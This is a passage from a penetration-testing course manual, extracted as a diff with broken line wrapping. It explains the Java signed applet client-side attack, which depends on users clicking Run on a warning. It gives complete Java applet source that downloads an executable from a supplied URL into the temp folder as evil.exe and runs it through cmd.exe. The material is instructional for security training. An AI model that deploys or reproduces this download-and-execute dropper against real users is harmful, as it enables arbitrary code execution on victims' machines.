@@ -1,0 +1,132 @@
+OS-42440 Jared Pines
+Penetration Testing with Kali Linux
+P
+WK
+Copyright © 2018
+Offensive Security Ltd. All rights reserved.
+Page 
+224
+of 
+380
+12
+.3 
+-
+Java Signed Applet
+Attack
+The  previous  client  side  exploit  relied  on  an  existing  vulnerability  in  our  victim’s 
+browser
+;
+because of ou
+r information gathering efforts, 
+we had the opportunity to know 
+of this vulnerability ahead of time. However, this is not always possible, nor is it always 
+the best approach to take during client side attacks.
+A good example of a client side 
+exploit based 
+on a 
+human vulnerability
+,
+as opposed 
+to a 
+software vulnerability
+,
+is the 
+Java Applet 
+c
+lient 
+s
+ide 
+attack
+.
+This attack affects targets with Java installed and enabled in their browsers 
+–
+a required 
+feature for many administrators and power users. As Java
+-
+ena
+bled browsers can run 
+Java applications, 
+it
+is
+quite trivial to make our own malicious Java applet which will 
+execute code of our choosing when run
+. However, 
+there
+is
+one 
+drawback: 
+the user will 
+get  a  warning  box  before  execution  of  our  Java  payload.  The  average  user  may  not 
+understand the implications of clicking 
+Run
+on this warning box
+.
+I
+f 
+the user runs 
+the 
+program
+, the Java software installed on the victim’s machine will execute o
+ur payload 
+happily. 
+The Java code below will download a given executable and execute it in a temporary 
+directory on the target machine.
+import java.applet.*;
+import java.awt.*;
+import java.io.*;
+import java.net.URL;
+import java.util.*;
+/**
+*
+Author: 
+Offensive Security
+*
+This Java applet will download a file and execute it.
+**/
+
+public class Java extends Applet {
+private Object initialized = null;
+public Object isInitialized()
+{
+return initialized;
+}
+public void init() {
+Process f;
+try {
+String tmpdir = System.getProperty("java.io.tmpdir") + File.separator;
+String expath = tmpdir + "evil.exe";
+String  download = "";
+download = getParameter("1");
+if (download.length() > 0) {
+// URL parameter
+URL url = new URL(download);
+// 
+Get an input stream for reading
+InputStream in = url.openStream();
+// Create a buffered input stream for efficency
+BufferedInputStream bufIn = new BufferedInputStream(in);
+File outputFile = new File(expath);
+OutputStream out = new BufferedOutputStream(new 
+FileOutputStream(outputFile));
+byte[] buffer = new byte[2048];
+for (;;)  {
+int nBytes = bufIn.read(buffer);
+if (nBytes <= 0) break;
+out.write(buffer, 0, nBytes);
+}
+out.flush();
+out.close();
+in.close();
+f = Runtime.getRuntime().exec("cmd.exe /c " + expath);
+}
+} catch(IOException e) {
+e.printStackTrace();
+}
+/* ended here and commented out below for 
+bypass */
+catch (Exception exception)
+{
+exception.printStackTrace();
+}
+}
+}
